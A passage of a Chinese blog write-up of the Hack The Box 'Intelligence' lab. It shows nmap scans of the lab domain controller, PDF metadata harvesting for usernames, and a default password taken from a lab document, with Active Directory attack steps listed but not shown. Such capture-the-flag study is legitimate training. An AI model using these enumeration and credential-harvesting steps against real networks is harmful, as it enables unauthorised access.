

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：PDF文件创建人信息批量获取、PDF文件批量下载、PDF内容敏感信息泄露、kerbrute 验证域用户名是否有效、枚举域用户密码是否正确、SMB敏感信息泄露、NTLMv2攻击(获取密码)、Krbrelayx、dnstool、responder、bloodhound 域环境枚举与利用、滥用读取GMSA密码、伪造服务票据、使用票据登录域控">
<meta property="og:type" content="article">
<meta property="og:title" content="Intelligence-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2024/03/31/Intelligence-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：PDF文件创建人信息批量获取、PDF文件批量下载、PDF内容敏感信息泄露、kerbrute 验证域用户名是否有效、枚举域用户密码是否正确、SMB敏感信息泄露、NTLMv2攻击(获取密码)、Krbrelayx、dnstool、responder、bloodhound 域环境枚举与利用、滥用读取GMSA密码、伪造服务票据、使用票据登录域控">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/5.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/6.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/7.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/8.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/9.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/10.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/11.png">
<meta property="og:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/12.png">
<meta property="article:published_time" content="2024-03-31T15:50:55.000Z">
<meta property="article:modified_time" content="2024-04-30T10:09:20.028Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/Intelligence-htb-writeup/1.png">
  
  
  
  <title>Intelligence-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/P2note/" target="_self">
                    
                    <span>综合安全工具集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Intelligence-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-31 23:50" pubdate>
          2024年3月31日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          34k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          286 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Intelligence-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：PDF文件创建人信息批量获取、PDF文件批量下载、PDF内容敏感信息泄露、kerbrute 验证域用户名是否有效、枚举域用户密码是否正确、SMB敏感信息泄露、NTLMv2攻击(获取密码)、Krbrelayx、dnstool、responder、bloodhound 域环境枚举与利用、滥用读取GMSA密码、伪造服务票据、使用票据登录域控</p>
<span id="more"></span>  

<p>参考链接：<code>https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html</code></p>
<p>参考链接：<code>https://teemuhakkarainen.com/hack-the-box-intelligence/</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.248</p>
<p>2、扫描下开放端口情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-29 22:34 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span><br>Host is up (<span class="hljs-number">0.40</span>s latency).<br>Not shown: <span class="hljs-number">65516</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span>/tcp    open  domain<br><span class="hljs-number">80</span>/tcp    open  http<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">464</span>/tcp   open  kpasswd5<br><span class="hljs-number">593</span>/tcp   open  http-rpc-epmap<br><span class="hljs-number">636</span>/tcp   open  ldapssl<br><span class="hljs-number">3268</span>/tcp  open  globalcatLDAP<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl<br><span class="hljs-number">5985</span>/tcp  open  wsman<br><span class="hljs-number">9389</span>/tcp  open  adws<br><span class="hljs-number">49667</span>/tcp open  unknown<br><span class="hljs-number">49683</span>/tcp open  unknown<br><span class="hljs-number">49684</span>/tcp open  unknown<br><span class="hljs-number">49694</span>/tcp open  unknown<br><span class="hljs-number">49743</span>/tcp open  unknown<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">34.79</span> seconds<br>                                                                                                       <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">53</span>,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49683</span>,<span class="hljs-number">49684</span>,<span class="hljs-number">49694</span>,<span class="hljs-number">49743</span>,    <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49683</span>,<span class="hljs-number">49684</span>,<span class="hljs-number">49694</span>,<span class="hljs-number">49743</span> -sC -sV --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-29 22:35 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span><br>Host is up (<span class="hljs-number">0.36</span>s latency).<br><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span>/tcp    open  domain?<br><span class="hljs-number">80</span>/tcp    open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span><br>|_http-title: Intelligence<br><span class="hljs-number">88</span>/tcp    open  tcpwrapped<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-29</span>T21:<span class="hljs-number">38</span>:<span class="hljs-number">40</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">7</span>h00m00s from scanner time.<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername: <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span>::&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: <span class="hljs-number">2021</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T00:<span class="hljs-number">43</span>:<span class="hljs-number">16</span><br>|_Not valid after:  <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T00:<span class="hljs-number">43</span>:<span class="hljs-number">16</span><br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">464</span>/tcp   open  kpasswd5?<br><span class="hljs-number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span>/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername: <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span>::&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: <span class="hljs-number">2021</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T00:<span class="hljs-number">43</span>:<span class="hljs-number">16</span><br>|_Not valid after:  <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T00:<span class="hljs-number">43</span>:<span class="hljs-number">16</span><br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-29</span>T21:<span class="hljs-number">38</span>:<span class="hljs-number">37</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">7</span>h00m00s from scanner time.<br><span class="hljs-number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-29</span>T21:<span class="hljs-number">38</span>:<span class="hljs-number">42</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">6</span>h59m57s from scanner time.<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername: <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span>::&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: <span class="hljs-number">2021</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T00:<span class="hljs-number">43</span>:<span class="hljs-number">16</span><br>|_Not valid after:  <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T00:<span class="hljs-number">43</span>:<span class="hljs-number">16</span><br><span class="hljs-number">3269</span>/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)<br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-29</span>T21:<span class="hljs-number">38</span>:<span class="hljs-number">42</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">7</span>h00m00s from scanner time.<br>| ssl-cert: Subject: commonName=dc.intelligence.htb<br>| Subject Alternative Name: othername: <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span>::&lt;unsupported&gt;, DNS:dc.intelligence.htb<br>| Not valid before: <span class="hljs-number">2021</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T00:<span class="hljs-number">43</span>:<span class="hljs-number">16</span><br>|_Not valid after:  <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T00:<span class="hljs-number">43</span>:<span class="hljs-number">16</span><br><span class="hljs-number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br><span class="hljs-number">9389</span>/tcp  open  adws?<br><span class="hljs-number">49667</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49683</span>/tcp open  tcpwrapped<br><span class="hljs-number">49684</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49694</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49743</span>/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: mean: <span class="hljs-number">6</span>h59m59s, deviation: <span class="hljs-number">1</span>s, median: <span class="hljs-number">6</span>h59m59s<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-29</span>T21:<span class="hljs-number">38</span>:<span class="hljs-number">04</span><br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">171.95</span> seconds<br></code></pre></td></tr></table></figure>

<p>3、绑定下发现了域名地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(root㉿offsec)-[~]<br>└─<span class="hljs-meta"># echo <span class="hljs-string">&#x27;10.10.10.248 intelligence.htb dc.intelligence.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></code></pre></td></tr></table></figure>

<p>4、其他端口都尝试过了，暂时没有什么发现，那就访问下80端口的地址吧</p>
<p><code>http://10.10.10.248/</code><br><code>http://intelligence.htb/</code></p>
<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<p>5、这里子域名也枚举了，但是发现新增的子域名解析地址都是这个网页内容，说明入口点还是这个网页上面。</p>
<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p>6、这个网站上面存在很多PDF文件</p>
<p><code>http://10.10.10.248/documents/2020-01-01-upload.pdf</code></p>
<p><code>http://10.10.10.248/documents/2020-12-15-upload.pdf</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ exiftool <span class="hljs-number">2020</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span>-upload.pdf <br>ExifTool Version Number         : <span class="hljs-number">12.70</span><br>File Name                       : <span class="hljs-number">2020</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span>-upload.pdf<br>Directory                       : .<br>File Size                       : <span class="hljs-number">27</span> kB<br>File Modification Date/Time     : <span class="hljs-number">2024</span>:<span class="hljs-number">03</span>:<span class="hljs-number">29</span> <span class="hljs-number">23</span>:<span class="hljs-number">29</span>:<span class="hljs-number">36</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Access Date/Time           : <span class="hljs-number">2024</span>:<span class="hljs-number">03</span>:<span class="hljs-number">29</span> <span class="hljs-number">23</span>:<span class="hljs-number">29</span>:<span class="hljs-number">37</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Inode Change Date/Time     : <span class="hljs-number">2024</span>:<span class="hljs-number">03</span>:<span class="hljs-number">29</span> <span class="hljs-number">23</span>:<span class="hljs-number">29</span>:<span class="hljs-number">36</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : <span class="hljs-number">1.5</span><br>Linearized                      : No<br>Page Count                      : <span class="hljs-number">1</span><br>Creator                         : William.Lee<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ exiftool <span class="hljs-number">2020</span><span class="hljs-number">-12</span><span class="hljs-number">-15</span>-upload.pdf <br>ExifTool Version Number         : <span class="hljs-number">12.70</span><br>File Name                       : <span class="hljs-number">2020</span><span class="hljs-number">-12</span><span class="hljs-number">-15</span>-upload.pdf<br>Directory                       : .<br>File Size                       : <span class="hljs-number">27</span> kB<br>File Modification Date/Time     : <span class="hljs-number">2024</span>:<span class="hljs-number">03</span>:<span class="hljs-number">29</span> <span class="hljs-number">23</span>:<span class="hljs-number">29</span>:<span class="hljs-number">44</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Access Date/Time           : <span class="hljs-number">2024</span>:<span class="hljs-number">03</span>:<span class="hljs-number">29</span> <span class="hljs-number">23</span>:<span class="hljs-number">29</span>:<span class="hljs-number">45</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Inode Change Date/Time     : <span class="hljs-number">2024</span>:<span class="hljs-number">03</span>:<span class="hljs-number">29</span> <span class="hljs-number">23</span>:<span class="hljs-number">29</span>:<span class="hljs-number">44</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : <span class="hljs-number">1.5</span><br>Linearized                      : No<br>Page Count                      : <span class="hljs-number">1</span><br>Creator                         : Jose.Williams<br></code></pre></td></tr></table></figure>

<p>7、这里发现PDF文件的文件名都是有规律的，可以遍历的，下面使用burp进行遍历</p>
<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<p>8、这里发现了一些敏感信息，在PDF内容里</p>
<p><code>http://intelligence.htb/documents/2020-06-04-upload.pdf</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">New Account Guide<br>Welcome to Intelligence Corp!<br>Please login using your username and the <span class="hljs-keyword">default</span> password of:<br>NewIntelligenceCorpUser9876<br>After logging in please change your password as soon as possible.<br><br>新帐户指南<br>欢迎来到情报公司！<br>请使用您的用户名和默认密码登录：<br>NewIntelligenceCorpUser9876<br>登录后，请尽快更改您的密码。<br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
<p><code>http://intelligence.htb/documents/2020-12-30-upload.pdf</code></p>
